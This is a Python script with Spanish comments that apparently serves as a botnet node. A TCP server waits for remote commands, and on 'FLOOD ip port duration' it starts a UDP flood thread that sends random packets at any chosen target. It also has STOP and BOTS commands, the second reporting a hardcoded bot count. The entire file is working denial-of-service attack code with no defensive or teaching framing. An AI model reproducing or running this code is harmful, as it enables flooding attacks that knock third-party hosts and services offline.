import socket
import os
import time
import random
import asyncio
import threading

# Configuración
HOST = '0.0.0.0'  # Escucha en todas las interfaces
PORT = int(os.environ.get('PORT', 12345))  # Puerto por defecto 12345, configurable
BUFFER_SIZE = 1024
UDP_SEND_RATE = 0.01 # Enviar un paquete cada 0.01 segundos (100 paquetes por segundo)
running = True

def udp_flood(ip, port, duration):
    global running
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1024)
    start_time = time.time()
    print(f"Iniciando ataque UDP a {ip}:{port} durante {duration} segundos")

    while running and time.time() - start_time < duration:
        try:
            sock.sendto(bytes, (ip, port))
            time.sleep(UDP_SEND_RATE) # Controla la velocidad de envío
        except Exception as e:
            print(f"Error al enviar UDP: {e}")
            break
    print("Ataque UDP finalizado.")


def handle_client(conn, addr):
    global running
    print(f"Conexión desde {addr}")
    try:
        while running:
            data = conn.recv(BUFFER_SIZE)
            if not data:
                break

            message = data.decode().strip()
            print(f"Recibido: {message}")

            if message.startswith("FLOOD"):
                try:
                    _, ip, port, duration = message.split()
                    port = int(port)
                    duration = int(duration)
                    #threading.Thread(target=udp_flood, args=(ip, port, duration)).start()
                    udp_thread = threading.Thread(target=udp_flood, args=(ip, port, duration))
                    udp_thread.daemon = True # Permite que el programa termine incluso si el thread está corriendo
                    udp_thread.start()
                    conn.sendall("Ataque UDP iniciado.\n".encode())

                except ValueError:
                    conn.sendall("Error: Formato incorrecto.\n".encode())
                except Exception as e:
                    conn.sendall(f"Error al iniciar el ataque: {e}\n".encode())


            elif message == "STOP":
                running = False
                conn.sendall("Deteniendo ataque.\n".encode())
                break
            elif message == "BOTS":
                conn.sendall("1\n".encode()) # Hardcoded: Siempre reporta 1 bot activo
            else:
                conn.sendall("Comando desconocido.\n".encode())

    except Exception as e:
        print(f"Error en la conexión con {addr}: {e}")
    finally:
        print(f"Cerrando conexión con {addr}")
        conn.close()

def main():
    global running
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # Permite reusar la dirección
    server_socket.bind((HOST, PORT))
    server_socket.listen(1) # Acepta solo una conexión

    print(f"Escuchando en {HOST}:{PORT}")

    try:
        conn, addr = server_socket.accept()
        handle_client(conn, addr)

    except KeyboardInterrupt:
        print("Interrupción manual.")
    finally:
        running = False
        server_socket.close()
        print("Servidor TCP finalizado.")


if __name__ == "__main__":
    main()
